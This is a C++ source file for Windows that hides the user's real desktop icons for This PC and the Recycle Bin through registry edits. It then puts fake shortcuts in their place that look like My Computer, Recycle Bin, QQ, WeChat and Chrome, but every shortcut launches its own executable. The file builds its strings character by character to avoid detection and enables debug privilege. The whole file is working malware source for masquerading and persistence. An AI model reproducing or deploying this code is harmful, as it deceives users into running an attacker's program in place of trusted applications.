#include "api.h"
#include <shlobj.h>
#include "function/interface.h"
#include <Shlwapi.h>
#include "reghelper.h"
#include "bootDesktop.h"
#include "public.h"
#include "log.h"
#include "Utils.h"

#pragma comment(lib,"shlwapi.lib")

DWORD HideDesktopIE()
{
	//"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\"
	char szHideDesktopIconsPath[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t',
		'\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n',
		'\\','E','x','p','l','o','r','e','r','\\','H','i','d','e','D','e','s','k','t','o','p','I','c','o','n','s',
		'\\','N','e','w','S','t','a','r','t','P','a','n','e','l','\\',0 };

	//"{B416D21B-3B22-B6D4-BBD3-BBD452DB3D5B}"
	char szIEPathGUID[] = { '{','B','4','1','6','D','2','1','B','-','3','B','2','2','-','B','6','D','4','-',
		'B','B','D','3','-','B','B','D','4','5','2','D','B','3','D','5','B','}',0 };
	int iRet = __SetRegistryKeyValueDword(HKEY_CURRENT_USER, szHideDesktopIconsPath, szIEPathGUID, TRUE);

	//RedrawWindow(NULL, NULL, NULL, RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN);
	lpSHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
	//InvalidateRect(NULL, NULL, TRUE);

	return TRUE;
}




DWORD HideDesktopMyComputer()
{
	//"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\"
	char szHideDesktopIconsPath[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t',
		'\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n',
		'\\','E','x','p','l','o','r','e','r','\\','H','i','d','e','D','e','s','k','t','o','p','I','c','o','n','s',
		'\\','N','e','w','S','t','a','r','t','P','a','n','e','l','\\',0 };

	//{20D04FE0-3AEA-1069-A2D8-08002B30309D}
	char szMycomputerGUID[] = { '{','2','0','D','0','4','F','E','0','-','3','A','E','A','-',
		'1','0','6','9','-','A','2','D','8','-','0','8','0','0','2','B','3','0','3','0','9','D','}',0 };
	int iRet = __SetRegistryKeyValueDword(HKEY_CURRENT_USER, szHideDesktopIconsPath, szMycomputerGUID, TRUE);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	//RedrawWindow(NULL, NULL, NULL, RDW_ERASE|RDW_INVALIDATE|RDW_ALLCHILDREN);
	lpSHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
	//InvalidateRect(NULL, NULL, TRUE);

	// 	HWND  hwndParent = lpFindWindowA( "Progman", "Program Manager" ); 
	// 	HWND  hwndSHELLDLL_DefView = lpFindWindowExA( hwndParent, NULL, "SHELLDLL_DefView", NULL ); 
	// 	HWND  hwndSysListView32 = lpFindWindowExA( hwndSHELLDLL_DefView, NULL, "SysListView32", "FolderView" );
	// 	iRet = lpUpdateWindow(hwndSysListView32);
	//	ListView_RedrawItems(hwndSysListView32, 0, ListView_GetItemCount(hwndSysListView32) - 1);
	return TRUE;
}


//{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}
DWORD HideDesktopRecycle()
{
	//"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\\"
	char szHideDesktopIconsPath[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t',
		'\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n',
		'\\','E','x','p','l','o','r','e','r','\\','H','i','d','e','D','e','s','k','t','o','p','I','c','o','n','s',
		'\\','N','e','w','S','t','a','r','t','P','a','n','e','l','\\',0 };

	//{645FF040-5081-101B-9F08-00AA002F954E}
	char szMycomputerGUID[] = { '{','6','4','5','F','F','0','4','0','-','5','0','8','1','-','1','0','1','B','-',
		'9','F','0','8','-','0','0','A','A','0','0','2','F','9','5','4','E','}',0 };
	int iRet = __SetRegistryKeyValueDword(HKEY_CURRENT_USER, szHideDesktopIconsPath, szMycomputerGUID, TRUE);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	lpSHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
	return TRUE;
}




DWORD createDesktopLnk(wchar_t* strCommand, wchar_t* strArguments, wchar_t* strWorkPath, wchar_t* strIcon, wchar_t* strLnkName)
{
	int iret = 0;
	HRESULT bResult = lpCoInitialize(NULL);
	if (bResult == S_OK)
	{
		IShellLink* pShellLink = 0;
		bResult = lpCoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&pShellLink);
		if (bResult >= 0)
		{
			IPersistFile* ppf = 0;
			bResult = pShellLink->QueryInterface(IID_IPersistFile, (void**)&ppf);
			if (bResult >= 0)
			{
				bResult = (ppf->Load(strLnkName, TRUE) >= 0);
				if (bResult == S_OK)
				{

					bResult = pShellLink->SetPath(strCommand);
					bResult = pShellLink->SetIconLocation(strIcon, 0);
					bResult = pShellLink->SetWorkingDirectory(strWorkPath);
					bResult = pShellLink->SetArguments(strArguments);
					bResult = ppf->Save(strLnkName, TRUE) >= 0;
					iret = TRUE;
				}
				else {

					wchar_t cmd[MAX_PATH];
					wchar_t icon[MAX_PATH];
					wchar_t arg[MAX_PATH];

					int hicon = 0;
					pShellLink->GetIconLocation(icon, MAX_PATH, &hicon);
					WIN32_FIND_DATAW fdw = { 0 };
					DWORD flag = 0;
					pShellLink->GetPath(cmd, MAX_PATH, &fdw, flag);
					pShellLink->GetArguments(arg, MAX_PATH);
					if (lstrcmpiW(cmd, strCommand) || lstrcmpiW(icon, strIcon) || lstrcmpiW(strArguments, arg))
					{
						bResult = pShellLink->SetPath(strCommand);
						bResult = pShellLink->SetIconLocation(strIcon, 0);
						bResult = pShellLink->SetWorkingDirectory(strWorkPath);
						bResult = pShellLink->SetArguments(strArguments);
						bResult = ppf->Save(strLnkName, TRUE) >= 0;
						iret = TRUE;
					}
				}

				ppf->Release();
			}
			else {
				writeLog("QueryInterface error:%d\r\n", GetLastError());
			}
			pShellLink->Release();
		}
		lpCoUninitialize();
	}

	return iret;
}




DWORD OpenIE()
{
	LPITEMIDLIST pidl;
	LPMALLOC pMalloc;

	if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_HISTORY, &pidl)))
	{
		SHELLEXECUTEINFO sei = { 0 };
		//ZeroMemory(&sei, sizeof(sei));
		sei.cbSize = sizeof(sei);
		sei.fMask = SEE_MASK_IDLIST;
		sei.lpIDList = pidl;
		sei.lpVerb = L"open";
		sei.hwnd = lpGetDesktopWindow();
		sei.nShow = SW_SHOWNORMAL;
		int iRet = lpShellExecuteExW(&sei);
		if (SUCCEEDED(SHGetMalloc(&pMalloc)))
		{
			pMalloc->Free(pidl);
			pMalloc->Release();
			return TRUE;
		}
	}
	return FALSE;
}




DWORD OpenRecycle()
{
	LPITEMIDLIST pidl;
	LPMALLOC pMalloc;

	if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_BITBUCKET, &pidl)))
	{
		SHELLEXECUTEINFO sei = { 0 };
		sei.cbSize = sizeof(sei);
		sei.fMask = SEE_MASK_IDLIST;
		sei.lpIDList = pidl;
		//sei.lpVerb = L"open";
		char szOpen[] = { 'o',0,'p',0,'e',0,'n',0,0,0 };
		sei.lpVerb = (wchar_t*)szOpen;
		sei.hwnd = lpGetDesktopWindow();
		sei.nShow = SW_SHOWNORMAL;
		int iRet = lpShellExecuteExW(&sei);
		if (SUCCEEDED(SHGetMalloc(&pMalloc)))
		{
			pMalloc->Free(pidl);
			pMalloc->Release();
			return TRUE;
		}
	}
	return FALSE;
}



DWORD OpenMyComputer()
{
	LPITEMIDLIST pidl;
	LPMALLOC pMalloc;
	if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_DRIVES, &pidl)))
	{
		SHELLEXECUTEINFO sei = { 0 };
		sei.cbSize = sizeof(sei);
		sei.fMask = SEE_MASK_IDLIST;
		sei.lpIDList = pidl;

		char szOpen[] = { 'o',0,'p',0,'e',0,'n',0,0,0 };
		sei.lpVerb = (wchar_t*)szOpen;
		sei.hwnd = lpGetDesktopWindow();
		sei.nShow = SW_SHOWNORMAL;
		int iRet = lpShellExecuteExW(&sei);
		if (SUCCEEDED(SHGetMalloc(&pMalloc)))
		{
			pMalloc->Free(pidl);
			pMalloc->Release();
			return TRUE;
		}
	}
	return FALSE;
}



DWORD __stdcall lnkDesktop(char* exePath, char* szSysDir, char* strUserName, char* strDataPath)
{
	int iRet = 0;

	EnableDebugPrivilege((HANDLE)GetCurrentProcessId(), TRUE);

	wchar_t wszExePath[MAX_PATH];
	lpMultiByteToWideChar(CP_ACP, 0, exePath, -1, (LPWSTR)wszExePath, MAX_PATH);

	wchar_t wszWorkPath[MAX_PATH];
	lpMultiByteToWideChar(CP_ACP, 0, strDataPath, -1, wszWorkPath, MAX_PATH);

	char strIco[MAX_PATH];
	lplstrcpyA(strIco, strDataPath);

	char szLinkFileName[MAX_PATH];

	if (iSystemVersion <= SYSTEM_VERSION_XP)
	{
		char szMycomputerXPIconName[] = { 'c','o','m','p','u','t','e','r','x','p','.','i','c','o',0 };

		lplstrcatA(strIco, szMycomputerXPIconName);

		char szComputerFormatWinXP[] = "%c:\\Documents and Settings\\%s\\桌面\\我的电脑.lnk";

		iRet = lpwsprintfA(szLinkFileName, szComputerFormatWinXP, szSysDir[0], strUserName);
	}
	else if (iSystemVersion == SYSTEM_VERSION_WIN10)
	{
		char szMycomputerWin10IconName[] = { 'c','o','m','p','u','t','e','r','w','i','n','1','0','.','i','c','o',0 };

		lplstrcatA(strIco, szMycomputerWin10IconName);

		char szComputerFormatWin10[] = "%c:\\Users\\%s\\Desktop\\此电脑.lnk";
		iRet = lpwsprintfA(szLinkFileName, szComputerFormatWin10, szSysDir[0], strUserName);
	}
	else if (iSystemVersion >= SYSTEM_VERSION_WIN11)
	{
		char szMycomputerWin10IconName[] = { 'c','o','m','p','u','t','e','r','w','i','n','1','1','.','i','c','o',0 };

		lplstrcatA(strIco, szMycomputerWin10IconName);

		char szComputerFormatWin10[] = "%c:\\Users\\%s\\Desktop\\此电脑.lnk";
		iRet = lpwsprintfA(szLinkFileName, szComputerFormatWin10, szSysDir[0], strUserName);
	}
	else if (iSystemVersion == SYSTEM_VERSION_WIN8)
	{

		char szMycomputerIconName[] = { 'c','o','m','p','u','t','e','r','.','i','c','o',0 };
		lplstrcatA(strIco, szMycomputerIconName);

		char szComputerFormatWin8[] = "%c:\\Users\\%s\\Desktop\\这台电脑.lnk";
		iRet = lpwsprintfA(szLinkFileName, szComputerFormatWin8, szSysDir[0], strUserName);
	}
	else  if (iSystemVersion == SYSTEM_VERSION_WIN7 || iSystemVersion == SYSTEM_VERSION_VISTA)
	{
		char szMycomputerIconName[] = { 'c','o','m','p','u','t','e','r','.','i','c','o',0 };
		lplstrcatA(strIco, szMycomputerIconName);

		char szComputerFormatWin7[] = "%c:\\Users\\%s\\Desktop\\计算机.lnk";
		iRet = lpwsprintfA(szLinkFileName, szComputerFormatWin7, szSysDir[0], strUserName);
	}

	szLinkFileName[0] = szSysDir[0];

	wchar_t wszLnkUnicode[MAX_PATH] = { 0 };
	lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);

	wchar_t wszIcoPath[MAX_PATH];
	lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);

	iRet = createDesktopLnk(wszExePath, L"MyComputer", L"", wszIcoPath, wszLnkUnicode);
	if (iRet)
	{
		HideDesktopMyComputer();
	}

	lplstrcpyA(strIco, strDataPath);
	if (iSystemVersion <= SYSTEM_VERSION_XP)
	{
		char szRecycleIcoPathFormatXP[] = "%c:\\Documents and Settings\\%s\\桌面\\回收站.lnk";
		iRet = lpwsprintfA(szLinkFileName, szRecycleIcoPathFormatXP, szSysDir[0], strUserName);
	}
	else if (iSystemVersion >= SYSTEM_VERSION_VISTA && iSystemVersion <= SYSTEM_VERSION_WIN11)
	{
		char szRecycleIcoPathFormatWin7[] = "%c:\\Users\\%s\\Desktop\\回收站.lnk";
		iRet = lpwsprintfA(szLinkFileName, szRecycleIcoPathFormatWin7, szSysDir[0], strUserName);
	}

	szLinkFileName[0] = szSysDir[0];
	lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);

	if (iSystemVersion == SYSTEM_VERSION_WIN10)
	{
		char szThisIconName[] = { 'r','e','c','y','c','l','e','w','i','n','1','0','.','i','c','o',0 };
		lplstrcatA(strIco, szThisIconName);
	}
	if (iSystemVersion == SYSTEM_VERSION_WIN11)
	{
		char szThisIconName[] = { 'r','e','c','y','c','l','e','w','i','n','1','1','.','i','c','o',0 };
		lplstrcatA(strIco, szThisIconName);
	}
	else
	{
		char szThisIconName[] = { 'r','e','c','y','c','l','e','w','i','n','7','.','i','c','o',0 };
		lplstrcatA(strIco, szThisIconName);
	}

	lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);
	iRet = createDesktopLnk(wszExePath, L"Recycle", L"", wszIcoPath, wszLnkUnicode);
	if (iRet)
	{
		HideDesktopRecycle();
	}

	/*
	char szIEFormatWin7Win8[] = "C:\\Users\\%s\\Desktop\\Internet Explorer.lnk";
	if (iSystemVersion <= SYSTEM_VERSION_XP)
	{
		char szIEFormatWinXP[] = "C:\\Documents and Settings\\%s\\桌面\\Internet Explorer.lnk";
		iRet = lpwsprintfA(szLinkFileName, szIEFormatWinXP, strUserName);
	}
	else if (iSystemVersion >= SYSTEM_VERSION_VISTA && iSystemVersion < SYSTEM_VERSION_WIN10)
	{
		iRet = lpwsprintfA(szLinkFileName, szIEFormatWin7Win8, strUserName);
	}
	else if (iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		char szIEFormatWin10[] = "C:\\Users\\%s\\Desktop\\Microsoft Edge.lnk";
		iRet = lpwsprintfA(szLinkFileName, szIEFormatWin7Win8, strUserName);
		//iRet = lpwsprintfA(szLinkFileName,szIEFormatWin10,strUserName);
	}

	szLinkFileName[0] = szSysDir[0];
	lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
	lplstrcpyA(strIco, strDataPath);
	if (iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		char szIEIconName[] = { 'i','e','.','i','c','o',0 };
		lplstrcatA(strIco, szIEIconName);
		//char szEdgeIconName[] = {'e','d','g','e','.','i','c','o',0};
		//lplstrcatA(strIco,szEdgeIconName);
	}
	else
	{
		char szIEIconName[] = { 'i','e','.','i','c','o',0 };
		lplstrcatA(strIco, szIEIconName);
	}

	lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);
	iRet = PretendOnDestTop(wszExePath, L"IE", L"", wszIcoPath, wszLnkUnicode);
	if (iRet)
	{
		HideIEOnDesktop();
	}
	*/

	if (*strQQPath)
	{
		lplstrcpyA(strIco, strDataPath);
		char szQQIconName[] = { 'q','q','.','i','c','o',0 };
		lplstrcatA(strIco, szQQIconName);
		lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);

		char szQQLnkFormatSelfmake[] = "C:\\Users\\%s\\Desktop\\腾讯QQ.lnk";
		char szQQLnkFormatSelfmakeWinXP[] = "C:\\Documents and Settings\\%s\\桌面\\腾讯QQ.lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName, szQQLnkFormatSelfmake, strUserName);
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName, szQQLnkFormatSelfmakeWinXP, strUserName);
		}

		szLinkFileName[0] = szSysDir[0];
		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
		iRet = createDesktopLnk(wszExePath, L"QQ", wszWorkPath, wszIcoPath, wszLnkUnicode);
		if (iRet == FALSE)
		{
			/*
			char szQQLnkFormat[] = "C:\\Users\\%s\\Desktop\\腾讯 QQ.lnk";
			char szQQLnkFormatWinXP[] = "C:\\Documents and Settings\\%s\\桌面\\腾讯 QQ.lnk";
			if (iSystemVersion >= SYSTEM_VERSION_VISTA)
			{
				iRet = lpwsprintfA(szLinkFileName, szQQLnkFormat, strUserName);
			}
			else
			{
				iRet = lpwsprintfA(szLinkFileName, szQQLnkFormatWinXP, strUserName);
			}

			szLinkFileName[0] = szSysDir[0];
			lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
			iRet = createDesktopLnk(wszExePath, L"QQ", wszWorkPath, wszIcoPath, wszLnkUnicode);
			if (iRet == 0)
			{

			}
			*/
		}
	}

	if (*szWechatPath)
	{
		lplstrcpyA(strIco, strDataPath);
		char szWechatIconName[] = { 'w','e','c','h','a','t','.','i','c','o',0 };
		lplstrcatA(strIco, szWechatIconName);
		lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);

		char szwxLnkFormat[] = "C:\\Users\\%s\\Desktop\\微信.lnk";
		char szwxLnkFormatWinXP[] = "C:\\Documents and Settings\\%s\\桌面\\微信.lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName, szwxLnkFormat, strUserName);
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName, szwxLnkFormatWinXP, strUserName);
		}

		szLinkFileName[0] = szSysDir[0];
		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
		iRet = createDesktopLnk(wszExePath, L"wechat", wszWorkPath, wszIcoPath, wszLnkUnicode);
		if (iRet)
		{
			/*
			char szwxLnkFormatSelfmake[] = "C:\\Users\\%s\\Desktop\\微 信.lnk";
			char szwxLnkFormatSelfmakeWinXP[] = "C:\\Documents and Settings\\%s\\桌面\\微 信.lnk";
			if (iSystemVersion >= SYSTEM_VERSION_VISTA)
			{
				iRet = lpwsprintfA(szLinkFileName, szwxLnkFormatSelfmake, strUserName);
			}
			else
			{
				iRet = lpwsprintfA(szLinkFileName, szwxLnkFormatSelfmakeWinXP, strUserName);
			}

			szLinkFileName[0] = szSysDir[0];
			lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
			iRet = createDesktopLnk(wszExePath, L"wechat", wszWorkPath, wszIcoPath, wszLnkUnicode);
			if (iRet == 0)
			{

			}*/
		}
	}

	if (*szChromePath)
	{
		char szChromeFormatAllUser[] = "C:\\Users\\%s\\Desktop\\Google Chrome.lnk";
		char szChromeFormatAllUserWinXP[] = "C:\\Documents and Settings\\%s\\桌面\\Google Chrome.lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName, szChromeFormatAllUser, strUserName);		//"public"
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName, szChromeFormatAllUserWinXP, strUserName);
		}

		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);
		lplstrcpyA(strIco, strDataPath);
		lplstrcatA(strIco, "chrome.ico");
		lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);
		iRet = createDesktopLnk(wszExePath, L"CHROME", wszWorkPath, wszIcoPath, wszLnkUnicode);
		if (iRet == 0)
		{
		}
	}

	/*
	if (*szFireFoxPath)
	{
		char szFireFoxFormatAllUser[] = "C:\\Users\\%s\\Desktop\\Mozilla FireFox.lnk";
		char szFireFoxFormatAllUserWinXP[] = "C:\\Documents and Settings\\%s\\桌面\\Mozilla FireFox.lnk";
		if (iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			iRet = lpwsprintfA(szLinkFileName, szFireFoxFormatAllUser, strUserName);
		}
		else
		{
			iRet = lpwsprintfA(szLinkFileName, szFireFoxFormatAllUserWinXP, strUserName);
		}

		lpMultiByteToWideChar(CP_ACP, 0, szLinkFileName, -1, (LPWSTR)wszLnkUnicode, MAX_PATH);

		lplstrcpyA(strIco, strDataPath);
		lplstrcatA(strIco, "firefox.ico");
		lpMultiByteToWideChar(CP_ACP, 0, strIco, -1, wszIcoPath, MAX_PATH);
		iRet = PretendOnDestTop(wszExePath, L"FIREFOX", L"", wszIcoPath, wszLnkUnicode);
		if (iRet == 0)
		{
		}
	}*/

	return TRUE;
}

